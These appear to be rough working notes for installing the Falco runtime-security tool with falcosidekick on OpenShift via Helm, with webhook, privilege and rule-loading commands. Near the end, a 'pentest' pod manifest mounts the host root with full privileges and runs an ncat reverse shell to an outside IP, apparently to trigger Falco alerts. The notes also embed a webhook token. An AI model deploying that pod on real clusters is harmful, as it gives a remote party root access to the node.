https://medium.com/@suleyman.kutukoglu/kubernetes-falco-deployment-and-slack-integration-devsecops-cd8d5ad41980
https://github.com/falcosecurity/falcosidekick

https://rahulroyz.medium.com/container-runtime-security-monitoring-with-falco-and-openshift-part-i-6fbcede66e88




helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

helm install falco -n falco falcosecurity/falco \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set auditLog.enabled=true \
  --set falco.jsonOutput=true \
  --set falco.docker.enabled=false \
  --set falco.fileOutput.enabled=true \
  --create-namespace \
  --set falcosidekick.config.webhook.address="http://cp4waiops-falco-gateway-cp4waiops.itzroks-270003bu3k-rt8vw8-6ccd7f378ae819553d37d5f2ee142bd6-0000.eu-gb.containers.appdomain.cloud/webhookSingle" \
  --set falcosidekick.config.webhook.customHeaders="token:46c1ddfd8e00" \
  --set falcosidekick.config.webhook.checkcert="false"

oc project falco 

oc adm policy add-scc-to-user privileged -z falco
oc adm policy add-scc-to-user privileged -z falco-falcosidekick
oc adm policy add-scc-to-user privileged -z falco-falcosidekick-ui

oc adm policy add-scc-to-user privileged -z default




helm template falco -n falco falcosecurity/falco \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set auditLog.enabled=true \
  --set falco.jsonOutput=true \
  --set falco.fileOutput.enabled=true \
  --create-namespace \
  --set falcosidekick.config.webhook.address="https://webhook.site/f5c065a9-35d0-4b8d-9442-ed6a08b688a6"
  --set falcosidekick.config.webhook.customHeaders="token:CHANGEME,"
  --set falcosidekick.config.webhook.checkcert="false"


-H 'token: test'



  # customHeaders: # Custom headers to add in POST, useful for Authentication
  #   key: value
  # minimumpriority: "" # minimum priority of event for using this output, order is emergency|alert|critical|error|warning|notice|informational|debug or "" (default)
  # mutualtls: false # if true, checkcert flag will be ignored (server cert will always be checked)
  # checkcert: true # check if ssl certificate of the output is valid (default: true)



oc apply -n falco -f ./tools/97_addons/experimental/falco/falco.yaml



oc apply -n falco -f ./tools/97_addons/experimental/falco/falco_rules_all.yaml
oc delete -n falco pods --all



http://cp4waiops-falco-gateway-cp4waiops.itzroks-270003bu3k-rt8vw8-6ccd7f378ae819553d37d5f2ee142bd6-0000.eu-gb.containers.appdomain.cloud/webhookSingle
http://waiops-falco-gateway-service.cp4waiops/webhookSingle:8000



helm uninstall falco -n falco

apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-revshell-pod
  namespace: default
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: raesene/ncat
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "ncat --ssl 10.222.49.68 443 -e /bin/bash;" ]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
  volumes:
  - name: noderoot
    hostPath:
      path: /



oc run kuberecon --tty -i --image octarinesec/kube-recon
If you don't see a command prompt, try pressing enter.
/ # ./kube-recon


